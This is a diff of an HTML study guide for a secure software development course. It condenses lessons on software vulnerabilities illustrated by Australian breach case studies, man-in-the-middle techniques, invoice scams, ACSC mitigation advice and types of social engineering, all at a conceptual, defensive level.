-    <tr><td class="who">Content moderation &amp; offensive material</td><td>Developers of communication tools have an ethical duty to prevent the spread of offensive, harmful or unlawful content — filters, moderation algorithms, flagging systems. <i>E.g. failing to remove hate speech in a comments section, resulting in user harm.</i></td></tr>
-  </table>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Distinguish ethics from a code of ethics. When does a code become legally enforceable?</li>
-      <li>Name the ACS core values.</li>
-      <li>For each of the five issues, give one concrete example and one thing a developer could do to avoid it.</li>
-    </ol>
+    <div class="lab">Ignoring ethics</div>
+    <p>Loss of user trust · negative media and reputational damage · legal action or platform bans · long-term harm to individuals and communities.</p>
   </div>
 </section>
-<!-- ═══════════════ W2 L1 ═══════════════ -->
-<section class="lesson pagebreak">
-  <h2><span class="wk">Week 2 · Lesson 1</span>Types of Vulnerabilities &amp; Risks</h2>
-  <p class="intro">Common weaknesses in insecure software development environments, the real Australian incidents each one caused, and how to mitigate them. This is the densest lesson in the unit and the most likely source of case-study questions.</p>
 
+<section class="lesson big">
+  <h2><span class="wk">Week 2 · Lesson 1</span>Vulnerabilities, Risks &amp; Case Studies</h2>
   <div class="box def">
-    <div class="lab">Framing definition</div>
-    <p>When systems and processes are <b>not properly protected</b>, they become vulnerable to a wide range of cyber threats and risks. These weaknesses can be exploited by attackers to gain access to data, disrupt services, or compromise user trust.</p>
-  </div>
-
-  <h3><span class="tag">Vulnerability 1</span>Poorly secured APIs</h3>
-  <p>APIs are essential to modern software development, letting applications interact and share data. <b>Insecure APIs are a major attack vector.</b> They may expose sensitive functions or data when authentication, encryption or rate-limiting aren't correctly implemented. Developers often rely on third-party APIs, or hastily create custom ones without robust security checks. Poorly documented or unmanaged APIs increase the risk of data leaks, unauthorised access and service disruption.</p>
-  <div class="box case">
-    <div class="lab">Case study · Optus (2022)</div>
-    <p>The Australian telco suffered a major data breach where unauthorised access to customer data was facilitated in part by an <b>exposed API</b>. The incident affected over <b>9 million Australians</b> and revealed flaws in access controls and authentication mechanisms on public-facing systems.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Implement strong authentication and authorisation on all endpoints.</li>
-      <li>Use HTTPS to encrypt all communications.</li>
-      <li>Limit data exposure through API responses.</li>
-      <li>Enable rate limiting and throttling to prevent abuse.</li>
-      <li>Conduct regular API security assessments and audits.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 2</span>Malware</h3>
-  <p>Malicious software designed to infiltrate or damage systems. In development environments, malware can be introduced through <b>infected libraries, compromised devices, or phishing attacks</b>. It may lead to data theft, corruption, or system control by external actors — often introduced unknowingly through reused or unvetted third-party code.</p>
-  <div class="box case">
-    <div class="lab">Case study · Toll Group (2020)</div>
-    <p>The Australian logistics company was hit by <b>two ransomware attacks within three months</b>. The attacks encrypted data and disrupted operations across the country, causing significant financial and reputational damage. The malware entered through <b>phishing</b> and exploited <b>outdated software</b>.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Use up-to-date anti-malware tools across all development systems.</li>
-      <li>Scan dependencies and code libraries for malicious components.</li>
-      <li>Restrict admin access and employ application whitelisting.</li>
-      <li>Educate developers on recognising phishing attempts.</li>
-      <li>Monitor systems for unusual behaviour or unauthorised software.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 3</span>Unpatched software</h3>
-  <p>Software containing known vulnerabilities that haven't been fixed by applying updates. Attackers actively scan for outdated systems to gain unauthorised access, disrupt services or escalate privileges. In development environments, both <b>operating systems and software tools</b> (IDEs, frameworks, libraries) may be neglected.</p>
-  <div class="box case">
-    <div class="lab">Case study · Accellion file transfer software (2021)</div>
-    <p>Attackers exploited an <b>unpatched vulnerability</b> in Accellion file transfer software used by multiple Australian organisations. The flaw let hackers exfiltrate sensitive documents from government agencies and private companies.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Establish automated patch management for all development tools and environments.</li>
-      <li>Monitor vendor announcements for critical security updates.</li>
-      <li>Test and deploy patches in staging environments before full rollout.</li>
-      <li>Maintain an inventory of all software components and their update status.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 4</span>Poor identity &amp; access management (IAM)</h3>
-  <p>IAM defines how users are identified and what resources they can access. Weak practices — <b>shared credentials, lack of MFA, improper role assignments</b> — can give attackers or insiders more access than necessary. In development, IAM restricts who can access source code, databases and deployment tools.</p>
-  <div class="box case">
-    <div class="lab">Case study · Australian National University (2023)</div>
-    <p>ANU reported a data breach resulting from unauthorised access through <b>compromised credentials</b>. Lack of MFA and inadequate logging contributed to delayed detection.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Enforce least privilege principles.</li>
-      <li>Use MFA for all accounts, especially privileged ones.</li>
-      <li>Avoid shared accounts; assign unique credentials to each user.</li>
-      <li>Conduct regular reviews of access logs and permissions.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 5</span>Insider threats</h3>
-  <p>Individuals within an organisation misusing their access to compromise systems or data. In development, this could mean a <b>disgruntled employee</b> introducing malicious code, leaking source code, or selling sensitive project details.</p>
-  <div class="box case">
-    <div class="lab">Case study · Fintech startup (2022)</div>
-    <p>A former employee of an Australian fintech startup was investigated for <b>planting backdoors</b> in the company's codebase before leaving. The issue was discovered only after suspicious traffic patterns were observed.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Implement version control and code review processes.</li>
-      <li>Restrict access based on job roles and revoke access immediately on exit.</li>
-      <li>Monitor developer activity and system logs for anomalies.</li>
-      <li>Provide training on ethical development and security policies.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 6</span>Man-in-the-middle (MitM) attacks</h3>
-  <p>An attacker secretly <b>intercepts or alters communication</b> between two parties who believe they're talking directly to each other. The attacker creates separate connections with each party and relays messages, making it seem like a normal conversation while it's actually being controlled or monitored.</p>
-  <p>Common scenarios include an <b>unencrypted Wi-Fi network</b> (easy to intercept traffic) and <b>email</b> (often lacks default encryption). Encryption helps, but attackers can still trick users into fake (phishing) websites or record traffic for later use, making detection difficult.</p>
-
-  <h4>Common MitM techniques</h4>
-  <table>
-    <tr><td class="who" style="width:40mm">SSL stripping</td><td>The attacker connects securely (HTTPS) to the website, but uses an insecure (HTTP) connection with the user, exposing sensitive data.</td></tr>
-    <tr><td class="who">Evil twin attacks</td><td>A fake Wi-Fi hotspot that looks like a trusted network; once connected, all user traffic can be monitored or altered.</td></tr>
-    <tr><td class="who">Email hijacking</td><td>The attacker gains access to an email account, monitors conversations, and impersonates a party to redirect funds during a money transfer.</td></tr>
-    <tr><td class="who">Wi-Fi eavesdropping</td><td>Fake public Wi-Fi networks with trustworthy-looking names intercept data being sent.</td></tr>
-    <tr><td class="who">Session hijacking</td><td>The attacker steals session data (cookies, session keys) to take control of an active session.</td></tr>
-    <tr><td class="who">DNS spoofing</td><td>DNS records are changed to redirect users from a real website to a fake one.</td></tr>
-    <tr><td class="who">IP spoofing</td><td>The attacker disguises their IP address to trick systems into thinking traffic is from a trusted source.</td></tr>
-  </table>
-
-  <div class="split">
-    <div class="box plain">
-      <div class="lab">What attackers are after</div>
-      <ul>
-        <li>Spying on conversations or data.</li>
-        <li>Stealing personal info — credit card numbers, login credentials.</li>
-        <li>Redirecting money transfers.</li>
-        <li>Corrupting or manipulating transmitted data.</li>
-      </ul>
-    </div>
-    <div class="box mit">
-      <div class="lab">Preventing MitM</div>
-      <ul>
-        <li><b>Email security tools</b> — monitor email traffic, block suspicious activity.</li>
-        <li><b>Web security tools</b> — detect unsafe traffic, stop redirects to malicious sites.</li>
-        <li><b>Educate staff and users</b> — recognise fake Wi-Fi and suspicious emails, using real cases.</li>
-        <li><b>Keep credentials secure</b> — strong, unique passwords changed at least every three months.</li>
-      </ul>
-    </div>
-  </div>
-  <div class="box case">
-    <div class="lab">Case study · Australian targets</div>
-    <p>Australian users have been targeted by MitM attacks when accessing <b>banking apps over insecure Wi-Fi</b>. In some cases, attackers redirected traffic to fake login pages to steal credentials.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Always use HTTPS and encrypted protocols for all communications.</li>
-      <li>Avoid public Wi-Fi without VPN protection.</li>
-      <li>Use certificate pinning where applicable.</li>
-      <li>Validate digital certificates and implement strong network segmentation.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">MitM variants</span>Spoofing &amp; invoice scamming</h3>
-  <h4>Email spoofing</h4>
-  <p>An attacker forges the sender's address to make an email look like it came from someone you know or trust — commonly used in <b>phishing and spam attacks</b>. Since most email software shows only the display name or forged address, users often don't notice anything suspicious, leading them to click malicious links, open infected attachments, send personal data, or transfer money.</p>
-  <h4>Phone / caller ID spoofing</h4>
-  <p>Also known as <b>CLI overstamping</b> — a caller hides their real number and displays a fake one, often a local or trusted number, to increase the chance you'll answer. In Australia, <b>spoofing is legal unless used for scams or other malicious purposes</b>. Attackers often pretend to be from banks, government agencies or phone companies, try to steal personal or financial information, or call from overseas using an Australian-looking number.</p>
-  <h4>Invoice scamming</h4>
-  <p>Cybercriminals impersonate a business, intercept legitimate emailed invoices, and change the bank details so payments go to the scammer instead of the real business. Once transferred, the money is often quickly moved to overseas accounts, making it hard for banks or police to recover. In most cases, <b>the payer is responsible for the loss</b>, since the invoice wasn't paid to the correct company.</p>
-  <div class="box plain">
-    <div class="lab">Did you know</div>
-    <p>In 2021, <b>1 in 5 small businesses in Australia</b> were affected by invoice fraud, with an average loss of <b>$15,500</b>. <span style="color:var(--ink-faint)">(Source: xero.com)</span></p>
-  </div>
-
-  <h3><span class="tag">Vulnerability 7</span>Cyber security incidents</h3>
-  <p>Events that compromise the <b>integrity, confidentiality or availability</b> of data and systems. These can stem from external attacks, insider actions or system failures. In development environments, such incidents may disrupt coding, testing and deployment.</p>
-  <div class="box case">
-    <div class="lab">Case study · Service NSW (2021)</div>
-    <p>The data breach was triggered by a <b>phishing campaign</b> that compromised staff emails and exposed over <b>700,000 documents</b>, including driver's licences and personal details.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Develop and regularly update an incident response plan.</li>
-      <li>Implement detection systems (IDS/IPS) and logging.</li>
-      <li>Train all developers and staff in basic cyber hygiene.</li>
-      <li>Ensure backups are secure and tested regularly.</li>
-    </ul>
-  </div>
-  <div class="box plain">
-    <div class="lab">A common source — misdirected email</div>
-    <p>A very common source of breaches involving personal and sensitive information is <b>email</b>. It's easy to mistype an address, or select the wrong one via autocomplete, and accidentally send private information to the wrong person. These are known as <b>misdirected (or misaddressed) emails</b>, and are one of the most common types of data breach. The same problem existed with fax machines in the health industry — a mis-dialled number transmitted records to a stranger, or a page from a previous fax was left on the machine.</p>
-  </div>
-
-  <h3><span class="tag">Vulnerability 8</span>Risks from third-party software</h3>
-  <p>Any code, libraries or tools not developed in-house. These can introduce vulnerabilities if not properly vetted. Attackers may compromise widely used packages or hide malicious code in <b>legitimate-looking updates</b>.</p>
-  <div class="box case">
-    <div class="lab">Case study · SolarWinds (2020)</div>
-    <p>This global <b>supply-chain breach</b> affected companies worldwide, including Australian federal departments. Attackers inserted a <b>backdoor into a software update</b>, giving them access to sensitive networks.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Only use trusted sources for software and packages.</li>
-      <li>Conduct security audits of third-party tools.</li>
-      <li>Monitor vulnerability disclosures related to dependencies.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 9</span>Ineffective code review practices</h3>
-  <p>Code review helps ensure quality, security and maintainability. Skipping reviews or doing them poorly lets bugs and security flaws reach production — reviews are often <b>rushed or bypassed under time pressure</b>, especially in agile environments.</p>
-  <div class="box case">
-    <div class="lab">Case study · Online retailer checkout failure</div>
-    <p>An Australian online retailer suffered a checkout failure due to a <b>logic flaw missed during an informal code review</b>, leading to lost sales during a promotional period.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Enforce structured peer reviews for all code changes.</li>
-      <li>Use automated tools to detect common vulnerabilities (linters, static analysis).</li>
-      <li>Maintain coding standards and document review checklists.</li>
-      <li>Encourage a culture of constructive feedback and learning.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Vulnerability 10</span>Combining dev, testing &amp; production environments</h3>
-  <p>Combining environments increases risk. Development environments often lack the same security controls as production, and if they share infrastructure or data, attackers may exploit vulnerabilities in dev/test systems to gain <b>production access</b>.</p>
-  <div class="box case">
-    <div class="lab">Case study · Health provider (2019)</div>
-    <p>An Australian health provider accidentally exposed patient data when <b>testing a new system using live production data</b>. The test server was misconfigured and <b>indexed by search engines</b>.</p>
-  </div>
-  <div class="box mit">
-    <div class="lab">Mitigation</div>
-    <ul>
-      <li>Isolate dev, test and production environments physically and logically.</li>
-      <li>Avoid using real customer data in test environments.</li>
-      <li>Secure all environments equally and enforce access controls.</li>
-      <li>Monitor for environment-specific misconfigurations or data exposure.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Context</span>Connectivity raises the stakes</h3>
-  <p>The more connected we are, the more opportunities there are for data breaches. New technologies and new uses for technology are created rapidly, and risk assessment and security measures often can't keep up. <b>Smart home and Internet of Things (IoT) devices</b> have become popular, and these often lack proper security and encryption.</p>
-  <div class="box law">
-    <div class="lab">Australia's IoT Code of Practice</div>
-    <p>The Australian Government has released an IoT Code of Practice to increase the security of IoT technology. It contains <b>13 principles</b> — the first three should be prioritised:</p>
-    <ol>
-      <li>No duplicated default or weak passwords.</li>
-      <li>Implement a vulnerability disclosure policy.</li>
-      <li>Keep software securely updated.</li>
-    </ol>
-  </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Match each case study to its vulnerability from memory: Optus, Toll, Accellion, ANU, Service NSW, SolarWinds.</li>
-      <li>Which two case studies involve phishing as the entry point?</li>
-      <li>Name all seven MitM techniques, then give one mitigation that would stop each.</li>
-      <li>Why is the payer usually liable in an invoice scam?</li>
-      <li>State the first three IoT Code of Practice principles.</li>
-    </ol>
+    <div class="lab">Framing</div>
+    <p>When systems and processes are <b>not properly protected</b>, they become vulnerable to cyber threats. Attackers exploit these weaknesses to reach data, disrupt services, or compromise user trust.</p>
   </div>
 </section>
 
-<!-- ═══════════════ W2 L2 ═══════════════ -->
+<section class="lesson big">
+  <div class="vuln">
+    <div class="top">Poorly secured APIs · <span class="cs">Optus, 2022</span>
+      <span class="sub">APIs may expose sensitive functions when authentication, encryption or rate-limiting are wrong.</span></div>
+    <p>An <b>exposed API</b> facilitated unauthorised access to customer data. Affected <b>9M+ Australians</b>; revealed flaws in access controls and authentication on public-facing systems.</p>
+    <div class="mit"><b class="k">Mitigate</b>Strong authentication and authorisation on all endpoints · HTTPS everywhere · limit data in API responses · rate limiting and throttling · regular security assessments and audits.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Malware · <span class="cs">Toll Group, 2020</span>
+      <span class="sub">Enters via infected libraries, compromised devices or phishing.</span></div>
+    <p><b>Two ransomware attacks in three months</b> encrypted data and disrupted national operations. Entered through <b>phishing</b> and exploited <b>outdated software</b>.</p>
+    <div class="mit"><b class="k">Mitigate</b>Up-to-date anti-malware on all dev systems · scan dependencies and libraries · restrict admin access and whitelist applications · phishing training · monitor for unusual behaviour.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Unpatched software · <span class="cs">Accellion, 2021</span>
+      <span class="sub">Both operating systems and dev tools — IDEs, frameworks, libraries — get neglected.</span></div>
+    <p>Attackers exploited an <b>unpatched flaw</b> in file transfer software used by Australian organisations, exfiltrating documents from government agencies and private companies.</p>
+    <div class="mit"><b class="k">Mitigate</b>Automated patch management · monitor vendor announcements · test patches in staging before rollout · maintain an inventory of components and their update status.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Poor IAM · <span class="cs">ANU, 2023</span>
+      <span class="sub">Shared credentials, no MFA, improper role assignments.</span></div>
+    <p>A breach from unauthorised access through <b>compromised credentials</b>. Lack of MFA and inadequate logging <b>delayed detection</b>.</p>
+    <div class="mit"><b class="k">Mitigate</b>Enforce least privilege · MFA on all accounts, especially privileged · unique credentials, never shared · regular review of access logs and permissions.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Insider threats · <span class="cs">Fintech startup, 2022</span>
+      <span class="sub">Misuse of legitimate access, deliberate or accidental.</span></div>
+    <p>A former employee was investigated for <b>planting backdoors</b> in the codebase before leaving. Found only after suspicious traffic patterns appeared.</p>
+    <div class="mit"><b class="k">Mitigate</b>Version control and code review · restrict by role and revoke access immediately on exit · monitor activity and system logs · ethics and security policy training.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">MitM attacks · <span class="cs">Banking apps, public Wi-Fi</span>
+      <span class="sub">Communication intercepted or altered in transit.</span></div>
+    <p>Australian users were targeted when using banking apps over <b>insecure Wi-Fi</b>; attackers redirected traffic to <b>fake login pages</b> to steal credentials.</p>
+    <div class="mit"><b class="k">Mitigate</b>HTTPS and encrypted protocols · VPN on public Wi-Fi · certificate pinning · validate digital certificates · strong network segmentation.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Cyber security incidents · <span class="cs">Service NSW, 2021</span>
+      <span class="sub">Compromise the integrity, confidentiality or availability of data and systems.</span></div>
+    <p>A <b>phishing campaign</b> compromised staff email and exposed <b>700,000+ documents</b>, including driver's licences and personal details.</p>
+    <div class="mit"><b class="k">Mitigate</b>Incident response plan, updated regularly · detection systems (IDS/IPS) and logging · cyber hygiene training · secure, regularly tested backups.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Third-party software · <span class="cs">SolarWinds, 2020</span>
+      <span class="sub">Code, libraries and tools not built in-house.</span></div>
+    <p>A global supply-chain breach: attackers inserted a <b>backdoor into a software update</b>, reaching Australian federal departments and networks worldwide.</p>
+    <div class="mit"><b class="k">Mitigate</b>Trusted sources only · security audits of third-party tools · monitor vulnerability disclosures for dependencies.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Ineffective code review · <span class="cs">Online retailer checkout</span>
+      <span class="sub">Reviews rushed or bypassed under time pressure, especially in agile teams.</span></div>
+    <p>A <b>logic flaw missed in an informal review</b> caused a checkout failure, losing sales during a promotional period.</p>
+    <div class="mit"><b class="k">Mitigate</b>Structured peer review for all changes · automated tools (linters, static analysis) · coding standards and review checklists · constructive review culture.</div>
+  </div>
+  <div class="vuln">
+    <div class="top">Combined environments · <span class="cs">Health provider, 2019</span>
+      <span class="sub">Dev and test lack production's controls but share its data.</span></div>
+    <p>Patient data was exposed when a new system was tested using <b>live production data</b>. The test server was misconfigured and <b>indexed by search engines</b>.</p>
+    <div class="mit"><b class="k">Mitigate</b>Isolate environments physically and logically · never use real customer data in test · secure all environments equally · monitor for misconfigurations.</div>
+  </div>
+</section>
+<section class="lesson">
+  <h3>Man-in-the-middle, in detail</h3>
+  <p>An attacker <b>secretly intercepts or alters</b> communication between two parties who believe they're talking directly. Separate connections are made with each side and messages relayed, so the conversation looks normal while being monitored or controlled. Easiest on <b>unencrypted Wi-Fi</b> and <b>email</b> (often no default encryption). Encryption helps, but users can still be lured to phishing sites, or traffic recorded for later.</p>
+  <h4>Seven techniques</h4>
+  <ul>
+    <li><b>SSL stripping</b> — HTTPS to the site, HTTP to the user, exposing data.</li>
+    <li><b>Evil twin</b> — fake hotspot imitating a trusted network.</li>
+    <li><b>Email hijacking</b> — monitor a real thread, impersonate a party, redirect a transfer.</li>
+    <li><b>Wi-Fi eavesdropping</b> — trustworthy-looking free networks intercept traffic.</li>
+    <li><b>Session hijacking</b> — steal cookies or session keys to take over a live session.</li>
+    <li><b>DNS spoofing</b> — altered records send users to a fake site.</li>
+    <li><b>IP spoofing</b> — disguise the source address as trusted.</li>
+  </ul>
+  <h4>What attackers want</h4>
+  <p>Spy on conversations or data · steal personal information (card numbers, credentials) · redirect money transfers · corrupt or manipulate transmitted data.</p>
+  <div class="box mit">
+    <div class="lab">Preventing MitM</div>
+    <ul>
+      <li><b>Email security tools</b> — monitor traffic, block suspicious activity.</li>
+      <li><b>Web security tools</b> — detect unsafe traffic, stop malicious redirects.</li>
+      <li><b>Educate staff and users</b> — fake Wi-Fi, suspicious emails, using real case studies.</li>
+      <li><b>Keep credentials secure</b> — strong unique passwords, changed at least every three months.</li>
+    </ul>
+  </div>
+  <h3>Spoofing &amp; invoice scamming</h3>
+  <ul>
+    <li><b>Email spoofing</b> — the sender's address is forged. Most email shows only the display name, so users click links, open attachments, send data or transfer money.</li>
+    <li><b>Caller ID spoofing</b> (CLI overstamping) — a fake, often local number. <b>Legal in Australia unless used for scams or malicious purposes.</b> Attackers pose as banks, government or phone companies.</li>
+    <li><b>Invoice scamming</b> — a legitimate emailed invoice is intercepted and the <b>bank details changed</b>. Money moves offshore quickly and is rarely recovered. <b>The payer is usually responsible for the loss</b>, since the invoice wasn't paid to the correct company. In 2021, <b>1 in 5</b> Australian small businesses were affected, average loss <b>$15,500</b>.</li>
+  </ul>
+  <h3>Email as a breach source, and IoT</h3>
+  <p><b>Misdirected emails</b> — mistyping an address or picking the wrong autocomplete entry — are one of the most common types of data breach. The same problem existed with fax machines in health.</p>
+  <div class="box law">
+    <div class="lab">IoT Code of Practice</div>
+    <p>Connectivity raises the stakes: smart home and IoT devices often lack proper security and encryption, and risk assessment can't keep pace. The Australian Government's code has <b>13 principles</b>; prioritise the first three: <b>1.</b> no duplicated default or weak passwords · <b>2.</b> implement a vulnerability disclosure policy · <b>3.</b> keep software securely updated.</p>
+  </div>
+</section>
+
 <section class="lesson">
   <h2><span class="wk">Week 2 · Lesson 2</span>Mitigation Measures</h2>
-  <p class="intro">Strategies to reduce or eliminate threats, vulnerabilities and risks — drawing on ACSC and OAIC guidance.</p>
-
-  <div class="box def">
-    <div class="lab">Definition</div>
-    <p>To protect sensitive data and maintain secure systems, organisations must apply <b>mitigation strategies</b> that reduce or eliminate threats, vulnerabilities and risks. These are essential in both operational environments and during software development. The <b>ACSC</b> provides practical advice for preventing data breaches — technical controls such as MFA, regular software updates and strong password policies, as well as organisational strategies such as staff training and cyber awareness programs.</p>
-  </div>
-
+  <p>Organisations must apply <b>mitigation strategies</b> that reduce or eliminate threats, vulnerabilities and risks — in operational environments and during development. The <b>ACSC</b> advises both technical controls (MFA, updates, password policy) and organisational strategies (training, awareness programs).</p>
   <div class="box warn">
     <div class="lab">How credentials get stolen</div>
-    <p><b>Malicious attacks</b> are a main cause of data breaches reported in Australia, and stolen credentials often lead to them. Credentials are typically stolen when:</p>
-    <ul>
-      <li>Users are tricked into entering them on fake websites (<b>phishing</b>).</li>
-      <li>Attackers use automated guesses (<b>brute-force attacks</b>).</li>
-      <li>Hackers steal data from a <b>breached service</b>.</li>
-      <li><b>Malware</b> on a device captures login details.</li>
-    </ul>
+    <p>Fake websites (<b>phishing</b>) · automated guessing (<b>brute force</b>) · data taken from a <b>breached service</b> · <b>malware</b> capturing logins. Stolen credentials are behind many Australian breaches.</p>
   </div>
-
-  <h3><span class="tag">Strategy 1</span>Staff awareness</h3>
-  <p>Businesses must train staff to spot and avoid:</p>
+  <h3>1 · Staff awareness</h3>
+  <p>Train staff to spot <b>phishing</b> (fake emails harvesting login details) and <b>spear phishing</b> (targeted, using personal or company information). Include how to spot suspicious activity and the cyber risks relevant to each role.</p>
+  <h3>2 · Password safety <span style="font-weight:400;color:var(--ink-faint)">— ACSC</span></h3>
   <ul>
-    <li><b>Phishing</b> — fake emails that trick users into giving up login details.</li>
-    <li><b>Spear phishing</b> — targeted scams using personal or company information to seem more real.</li>
-  </ul>
-  <p>Training should include how to spot suspicious activity and understand the cyber risks relevant to each role.</p>
-
-  <h3><span class="tag">Strategy 2</span>Password safety</h3>
-  <p>The ACSC recommends:</p>
-  <ul>
-    <li>Use strong, long and unpredictable <b>passphrases</b>.</li>
-    <li>Don't reuse passwords across important accounts.</li>
-    <li>Change passwords regularly.</li>
-    <li>Lock accounts after too many failed login attempts.</li>
+    <li>Strong, long, unpredictable <b>passphrases</b>.</li>
+    <li>No reuse across important accounts; change regularly.</li>
+    <li>Lock accounts after too many failed logins.</li>
     <li>Reset compromised passwords immediately.</li>
-    <li>Avoid sharing passwords between secure and less secure services.</li>
+    <li>Don't share passwords between secure and less secure services.</li>
   </ul>
-
-  <h3><span class="tag">Strategy 3</span>Secure software practices</h3>
+  <h3>3 · Secure software practices</h3>
   <ul>
-    <li>Use <b>multi-factor authentication</b> for important actions and remote access.</li>
-    <li>Keep software, browsers and plugins up to date.</li>
-    <li>Enable anti-virus software to catch malware that steals data.</li>
+    <li><b>MFA</b> for important actions and remote access.</li>
+    <li>Keep software, browsers and plugins up to date; run anti-virus.</li>
     <li>Watch for suspicious account activity.</li>
-    <li>Be cautious with credential prompts — don't enter passwords via links from unknown sources; navigate to official websites manually to reset passwords; remember friends' accounts can also be hacked and used to send fake messages.</li>
+    <li>Never enter credentials via links from unknown sources — navigate to official sites manually. A friend's account can be hacked and used to send fake messages.</li>
   </ul>
-  <p style="color:var(--ink-faint);font-size:8.6pt">This advice comes from the Office of the Australian Information Commissioner (OAIC) and the ACSC.</p>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>List the four ways credentials are typically stolen.</li>
-      <li>Give the six ACSC password recommendations.</li>
-      <li>Why should you never reset a password via a link in an email?</li>
-    </ol>
-  </div>
 </section>
-<!-- ═══════════════ W2 L3 ═══════════════ -->
-<section class="lesson pagebreak">
-  <h2><span class="wk">Week 2 · Lesson 3</span>Social Engineering Attacks</h2>
-  <p class="intro">Attacks that use psychological manipulation to fool people into handing over confidential data, and how to defend against them.</p>
 
+<section class="lesson">
+  <h2><span class="wk">Week 2 · Lesson 3</span>Social Engineering Attacks</h2>
   <div class="box def">
     <div class="lab">Definition</div>
-    <p>Social engineering involves <b>some form of psychological manipulation</b>, fooling otherwise unsuspecting users or employees into handing over confidential or sensitive data. It commonly involves email or other communication that invokes <b>urgency, fear or similar emotions</b>, leading the victim to promptly reveal sensitive information, click a malicious link, or open a malicious file. Because it involves a human element, preventing these attacks can be tricky for enterprises.</p>
+    <p><b>Psychological manipulation</b> fooling users or employees into handing over confidential data. Usually invokes <b>urgency or fear</b>, leading the victim to reveal information, click a malicious link, or open a malicious file. Hard for enterprises to prevent because the weak point is <b>human</b>.</p>
   </div>
-
-  <h3><span class="tag">Six types</span>The attacks</h3>
   <table>
-    <thead><tr><th style="width:38mm">Type</th><th>How it works</th></tr></thead>
-    <tr><td class="who">Phishing</td><td>The most common social engineering attack. Most scams try to obtain personal info (names, addresses, passwords, PINs, account numbers), use shortened or misleading links to phishing landing pages, and incorporate threats, fear or urgency to get a quick response.</td></tr>
-    <tr><td class="who">Spear phishing</td><td>A <b>targeted</b> version of phishing where the attacker chooses specific individuals or enterprises and tailors messages based on their characteristics, job position and contacts to seem less conspicuous.</td></tr>
-    <tr><td class="who">Baiting</td><td>Offering something enticing (a download, or a corporate-branded USB stick) in exchange for login details or sensitive information. <i>E.g. a criminal leaves a USB labelled "Confidential" or "Bonuses" where a target will find it — plugging it in installs malware automatically.</i></td></tr>
-    <tr><td class="who">Quid pro quo</td><td>Similar to baiting — requesting login details or sensitive data in exchange for a service. <i>E.g. a hacker posing as a technology expert offers free IT assistance, or as a researcher offers $100 for network access "as part of an experiment". If it sounds too good to be true, it probably is.</i></td></tr>
-    <tr><td class="who">Pretexting</td><td>The human equivalent of phishing. The hacker creates a <b>false sense of trust</b> by impersonating a co-worker or authority figure to gain access to login details. <i>E.g. an email from "IT support" or a chat message from an "auditor".</i></td></tr>
-    <tr><td class="who">Tailgating / piggybacking</td><td>An unauthorised person <b>physically</b> follows an authorised person into a restricted area or system. <i>E.g. calling out to an employee to hold the door, or asking to quickly borrow their laptop or phone.</i></td></tr>
+    <tr><td class="who">Phishing</td><td>Most common. Harvests names, addresses, passwords, PINs, account numbers via misleading links, plus threats or urgency.</td></tr>
+    <tr><td class="who">Spear phishing</td><td><b>Targeted</b> — tailored to the person's characteristics, job position and contacts.</td></tr>
+    <tr><td class="who">Baiting</td><td>Something enticing in exchange for details — <i>a USB labelled "Confidential" that auto-installs malware</i>.</td></tr>
+    <tr><td class="who">Quid pro quo</td><td>A service in exchange for access — <i>fake IT assistance, or $100 for network access "for an experiment"</i>.</td></tr>
+    <tr><td class="who">Pretexting</td><td>False trust through impersonation — <i>a co-worker, "IT support", an "auditor"</i>.</td></tr>
+    <tr><td class="who">Tailgating</td><td><b>Physical</b> — following staff into a restricted area, or borrowing their laptop or phone.</td></tr>
   </table>
-
-  <h3><span class="tag">Defence</span>What organisations should do</h3>
-  <table>
-    <tr><td class="who" style="width:44mm">Employee education</td><td>The most effective defence against social engineering fraud is a <b>well-informed workforce</b>. Employees at all levels should understand what social engineering is, be aware of common techniques, and know how to respond. Training should be ongoing, practical and tailored to the organisation's operations.</td></tr>
-    <tr><td class="who">Policies &amp; procedures</td><td>Strong policies and clear procedures help employees respond to suspicious requests — verification protocols, information handling, approval workflows, and physical security practices.</td></tr>
-    <tr><td class="who">Email software &amp; filtering</td><td>Setting spam filters to high and enabling conversation threading helps users more easily detect phishing or suspicious activity.</td></tr>
-    <tr><td class="who">Secure devices &amp; updates</td><td>Maintaining updated and secure systems across all devices is fundamental. Outdated software is a key target, and anti-virus tools alone are insufficient without regular updates.</td></tr>
-  </table>
-
-  <h3><span class="tag">Defence</span>How individuals spot scams</h3>
-  <ol>
-    <li><b>Don't rush — think first.</b> Scammers want you to panic and click fast.</li>
